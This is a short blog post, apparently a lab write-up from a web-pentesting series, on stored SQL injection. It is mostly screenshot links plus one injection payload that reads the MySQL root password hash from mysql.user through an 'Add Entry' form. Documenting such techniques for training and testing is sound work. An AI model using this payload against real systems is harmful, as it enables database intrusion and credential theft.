---
layout: post
title: SQL Injection -Stored (Blog)
categories:
  - Web-Pentesting
---

<br>..

![134](https://teckk2.github.io/assets/images/Web%20Pentest/A1/134.png)
![135](https://teckk2.github.io/assets/images/Web%20Pentest/A1/135.png)
<br>Sql syntax error
![136](https://teckk2.github.io/assets/images/Web%20Pentest/A1/136.png)
![137](https://teckk2.github.io/assets/images/Web%20Pentest/A1/137.png)
<br>Using this SQL syntax along with some input, we can query for version of the database, and for each further SQL query we have to Add Entry
![138](https://teckk2.github.io/assets/images/Web%20Pentest/A1/138.png)
![139](https://teckk2.github.io/assets/images/Web%20Pentest/A1/139.png)
<br>**teck',(select password from mysql.user where user='root' limit 0,1))#**
![140](https://teckk2.github.io/assets/images/Web%20Pentest/A1/140.png)
<br>And we got the password hash for mysql root.
![141](https://teckk2.github.io/assets/images/Web%20Pentest/A1/141.png)
<br>And the password is **{bug}**

<p class="message">
  ~ Hack the World and Stay Noob
</p>

[Twitter](https://twitter.com/Teck__K2) / [Hack The Box](https://www.hackthebox.eu/profile/966) / [CTF Team](https://ctftime.org/team/20102) /
[Teck_N00bs Community Telegram](https://t.me/Teck_N00bs)

<script src="https://www.hackthebox.eu/badge/966"> </script>


